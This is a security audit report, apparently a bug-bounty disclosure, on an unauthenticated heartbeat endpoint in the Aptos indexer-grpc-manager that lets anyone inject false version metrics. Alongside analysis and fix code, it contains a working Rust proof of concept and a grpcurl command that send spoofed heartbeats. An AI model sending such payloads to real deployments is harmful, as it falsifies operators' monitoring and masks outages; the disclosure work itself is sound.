# Audit Report

## Title
Unauthenticated Heartbeat Endpoint Allows External Metric Manipulation via Dynamic Fullnode Registration

## Summary
The indexer-grpc-manager's heartbeat endpoint accepts unauthenticated gRPC requests from any network client and dynamically registers fullnodes based solely on the self-reported address in the request payload. This allows external attackers to inject arbitrary `known_latest_version` values into the `KNOWN_LATEST_VERSION` metric, tricking monitoring systems into believing the indexer is synchronized when it may be severely lagging.

## Finding Description
The vulnerability exists in the heartbeat handling flow where three critical security weaknesses combine:

**1. Unauthenticated Endpoint**: The gRPC heartbeat endpoint accepts requests from any client without authentication or authorization checks. [1](#0-0) 

**2. Dynamic Fullnode Registration**: When processing a heartbeat containing `FullnodeInfo`, the system automatically creates a new fullnode entry if the provided address doesn't exist in the tracked fullnodes map. [2](#0-1) 

The critical issue is at the `.or_insert()` call which creates new fullnode entries on-demand without validating whether the address is in the configured `fullnode_addresses` list.

**3. Unchecked Metric Update**: Any `known_latest_version` value provided in the `FullnodeInfo` directly updates the global `KNOWN_LATEST_VERSION` metric without validation of the source, chain_id match, or value reasonableness. [3](#0-2) 

**Attack Propagation Path**:
1. Attacker crafts a `HeartbeatRequest` with `service_info.address = "malicious-address"` and `service_info.info = FullnodeInfo { known_latest_version: 999999999999, ... }`
2. Request is sent to the publicly accessible gRPC manager endpoint
3. `GrpcManagerService::heartbeat()` accepts the request and calls `handle_heartbeat()`
4. `handle_fullnode_info()` is invoked, which creates a new fullnode entry via `.or_insert()`
5. `update_known_latest_version(999999999999)` sets the Prometheus metric
6. Monitoring dashboards show the inflated version, masking actual indexer lag

**Broken Security Guarantee**: The system assumes that only legitimate, configured fullnodes can update operational metrics. This vulnerability breaks that assumption by allowing arbitrary external actors to inject false monitoring data.

## Impact Explanation
This qualifies as **Medium Severity** under the Aptos bug bounty criteria for the following reasons:

**State Inconsistency Requiring Intervention**: While this doesn't corrupt blockchain state, it creates a critical operational state inconsistency where monitoring systems display false data about indexer synchronization status. This can lead to:

- **Masked Critical Failures**: Real indexer lag or failures go undetected because metrics show the system as healthy
- **Delayed Incident Response**: Operations teams won't receive alerts for actual synchronization problems
- **Data Freshness Violations**: Downstream applications relying on indexer data may serve stale information, believing it's current
- **Cascading Operational Issues**: Wrong operational decisions based on false metrics could compound into service outages

While not directly causing fund loss, the indexer is critical infrastructure for the Aptos ecosystem. Applications, exchanges, and DeFi protocols depend on accurate indexer data. Serving stale data while metrics indicate freshness creates a systemic reliability risk.

## Likelihood Explanation
**Likelihood: HIGH**

The attack has minimal barriers to execution:
- **No Authentication Required**: The gRPC endpoint accepts any connection
- **Simple Attack Vector**: Standard gRPC client tools can craft the exploit payload
- **No Special Privileges**: Attacker needs no validator access, stake, or insider knowledge
- **Network Accessibility**: The gRPC manager must be network-accessible for the distributed architecture to function
- **No Rate Limiting Observed**: An attacker can repeatedly send spoofed heartbeats to maintain the false metric

The only requirement is network access to the gRPC manager endpoint, which is typically exposed for legitimate fullnodes and data services to connect.

## Recommendation

Implement a multi-layered defense:

**1. Restrict Dynamic Registration**: Only accept heartbeats from pre-configured addresses:

```rust
fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    // Only process heartbeats from configured fullnodes
    let mut entry = match self.fullnodes.entry(address.clone()) {
        dashmap::mapref::entry::Entry::Occupied(e) => e,
        dashmap::mapref::entry::Entry::Vacant(_) => {
            warn!("Rejected heartbeat from unconfigured fullnode: {}", address);
            bail!("Fullnode address not in configured list");
        }
    };
    
    entry.get_mut().recent_states.push_back(info);
    if let Some(known_latest_version) = info.known_latest_version {
        // Validate chain_id matches
        if info.chain_id != self.chain_id {
            bail!("Chain ID mismatch");
        }
        trace!("Received known_latest_version ({}) from fullnode {}.", 
               known_latest_version, address);
        self.update_known_latest_version(known_latest_version);
    }
    // ... rest of function
}
```

**2. Add Authentication**: Implement mTLS or token-based authentication for the heartbeat endpoint to verify the identity of fullnodes.

**3. Validate Metric Values**: Add sanity checks on `known_latest_version` to reject obviously invalid values (e.g., far beyond current blockchain height).

**4. Fix Metric Update Logic**: The current implementation has a subtle bug where `KNOWN_LATEST_VERSION.set()` always uses the input version rather than the result of `fetch_max()`:

```rust
fn update_known_latest_version(&self, version: u64) {
    let prev = self.known_latest_version.fetch_max(version, Ordering::SeqCst);
    let actual_max = std::cmp::max(prev, version);
    KNOWN_LATEST_VERSION.set(actual_max as i64);
}
```

## Proof of Concept

```rust
// Proof of Concept: Metric Spoofing Attack
// This demonstrates how an external attacker can manipulate the KNOWN_LATEST_VERSION metric

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, 
    service_info::Info, 
    FullnodeInfo, 
    HeartbeatRequest, 
    ServiceInfo
};
use aptos_protos::util::timestamp::Timestamp;
use tonic::Request;

#[tokio::test]
async fn test_metric_spoofing_attack() {
    // Setup: Assume gRPC manager is running on localhost:50051
    let manager_address = "http://localhost:50051";
    
    // Step 1: Attacker creates gRPC client
    let mut client = GrpcManagerClient::connect(manager_address)
        .await
        .expect("Failed to connect to manager");
    
    // Step 2: Craft malicious heartbeat with inflated version
    let fake_version = 999_999_999_999u64; // Far beyond actual blockchain height
    let malicious_heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("attacker-controlled-node:50052".to_string()),
            info: Some(Info::FullnodeInfo(FullnodeInfo {
                chain_id: 1, // Match target chain ID
                timestamp: Some(Timestamp {
                    seconds: chrono::Utc::now().timestamp(),
                    nanos: 0,
                }),
                known_latest_version: Some(fake_version),
            })),
        }),
    };
    
    // Step 3: Send malicious heartbeat
    let response = client.heartbeat(Request::new(malicious_heartbeat))
        .await
        .expect("Heartbeat should be accepted");
    
    // Step 4: Verify the attack succeeded
    // The response contains the manager's known_latest_version
    let manager_version = response.into_inner().known_latest_version.unwrap();
    
    // If manager_version >= fake_version, the attack succeeded
    assert!(manager_version >= fake_version, 
            "Metric spoofing attack successful: manager now reports version {}",
            manager_version);
    
    // At this point, monitoring systems querying the KNOWN_LATEST_VERSION metric
    // will see the inflated value and incorrectly believe the indexer is synchronized
}
```

**Manual Testing Steps**:
1. Deploy indexer-grpc-manager with standard configuration
2. Use `grpcurl` or similar tool to send heartbeat: 
   ```bash
   grpcurl -d '{"service_info":{"address":"attacker:9000","info":{"fullnode_info":{"chain_id":1,"known_latest_version":999999999999}}}}' \
     localhost:50051 aptos.indexer.v1.GrpcManager/Heartbeat
   ```
3. Query Prometheus metrics endpoint and observe `aptos_indexer_grpc_v2_grpc_manager_known_latest_version` shows the spoofed value

**Notes**
This vulnerability is particularly concerning because:
1. The indexer infrastructure is critical for ecosystem functionality
2. The attack can be executed remotely with no special access
3. The impact compounds over time as monitoring systems make decisions based on false data
4. Detection is difficult since the malicious heartbeats appear as legitimate protocol messages

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L405-409)
```rust
    fn update_known_latest_version(&self, version: u64) {
        self.known_latest_version
            .fetch_max(version, Ordering::SeqCst);
        KNOWN_LATEST_VERSION.set(version as i64);
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
